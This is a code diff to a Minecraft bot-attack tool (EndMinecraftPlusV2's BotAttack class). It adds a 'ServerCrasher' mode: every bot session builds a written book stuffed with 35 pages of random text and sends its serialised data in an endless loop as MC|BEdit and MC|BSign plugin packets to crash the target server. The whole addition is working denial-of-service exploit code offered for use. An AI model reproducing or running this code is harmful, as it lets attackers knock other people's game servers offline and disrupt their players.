@@ -9,6 +9,7 @@ import cn.serendipityr.EndMinecraftPlusV2.VersionControl.OldVersion.CatAntiCheat
 import cn.serendipityr.EndMinecraftPlusV2.VersionControl.OldVersion.ForgeProtocol.MCForge;
 import io.netty.util.internal.ConcurrentSet;
 import org.spacehq.mc.protocol.MinecraftProtocol;
+import org.spacehq.mc.protocol.data.game.ItemStack;
 import org.spacehq.mc.protocol.data.message.Message;
 import org.spacehq.mc.protocol.packet.ingame.client.ClientChatPacket;
 import org.spacehq.mc.protocol.packet.ingame.client.ClientPluginMessagePacket;
@@ -18,6 +19,11 @@ import org.spacehq.mc.protocol.packet.ingame.server.ServerJoinGamePacket;
 import org.spacehq.mc.protocol.packet.ingame.server.ServerKeepAlivePacket;
 import org.spacehq.mc.protocol.packet.ingame.server.ServerPluginMessagePacket;
 import org.spacehq.mc.protocol.packet.ingame.server.entity.player.ServerPlayerPositionRotationPacket;
+import org.spacehq.opennbt.NBTIO;
+import org.spacehq.opennbt.tag.builtin.CompoundTag;
+import org.spacehq.opennbt.tag.builtin.ListTag;
+import org.spacehq.opennbt.tag.builtin.StringTag;
+import org.spacehq.opennbt.tag.builtin.Tag;
 import org.spacehq.packetlib.Client;
 import org.spacehq.packetlib.Session;
 import org.spacehq.packetlib.event.session.*;
@@ -26,6 +32,7 @@ import org.spacehq.packetlib.packet.Packet;
 import org.spacehq.packetlib.tcp.TcpSessionFactory;
 
 import java.io.ByteArrayOutputStream;
+import java.io.DataOutputStream;
 import java.io.IOException;
 import java.io.OutputStream;
 import java.net.InetSocketAddress;
@@ -97,6 +104,41 @@ public class BotAttack extends IAttack {
                                             throw new RuntimeException(e);
                                         }
                                     }).start();
+                                }
+                            }
+
+                            if (ConfigUtil.ServerCrasher && !c.getSession().hasFlag("crasher")) {
+                                c.getSession().setFlag("crasher", true);
+
+                                switch (ConfigUtil.ServerCrasherMode) {
+                                    case 1:
+                                        new Thread(() -> {
+                                            LogUtil.doLog(0, "[" + clientName.get(c) + "] 开始发送Crash Packet...", "ServerCrasher");
+
+                                            while (true) {
+                                                try {
+                                                    ItemStack crashBook = getCrashBook();
+
+                                                    ByteArrayOutputStream buf = new ByteArrayOutputStream();
+                                                    StreamNetOutput out = new StreamNetOutput(buf);
+
+                                                    out.writeShort(crashBook.getId());
+                                                    out.writeByte(crashBook.getAmount());
+                                                    out.writeShort(crashBook.getData());
+
+                                                    NBTIO.writeTag(new DataOutputStream(buf), crashBook.getNBT());
+
+                                                    byte[] crashData = buf.toByteArray();
+
+                                                    c.getSession().send(new ClientPluginMessagePacket("MC|BEdit", crashData));
+                                                    c.getSession().send(new ClientPluginMessagePacket("MC|BSign", crashData));
+
+                                                    Thread.sleep(ConfigUtil.ServerCrasherPacketDelay);
+                                                } catch (Exception ignored) {}
+                                            }
+                                        }).start();
+                                        break;
+                                    default:
                                 }
                             }
                         } else if (c.getSession().hasFlag("join")) {
@@ -470,5 +512,24 @@ public class BotAttack extends IAttack {
                 clickVerifiesHandle(extraMessage, session, username);
             }
         }
+    }
+
+    public static ItemStack getCrashBook() {
+        ItemStack crashBook = null;
+        CompoundTag nbtTag = new CompoundTag("crashBook");
+        List<Tag> pageList = new ArrayList<>();
+
+        // Plain Mode
+        nbtTag.put(new StringTag("author", OtherUtils.getRandomString(20, 20)));
+        nbtTag.put(new StringTag("title", OtherUtils.getRandomString(20, 20)));
+
+        for (int a = 0; a < 35; a++) {
+            pageList.add(new StringTag("", OtherUtils.getRandomString(600, 600)));
+        }
+
+        nbtTag.put(new ListTag("pages", pageList));
+        crashBook = new ItemStack(386, 1, 0, nbtTag);
+
+        return crashBook;
     }
 }
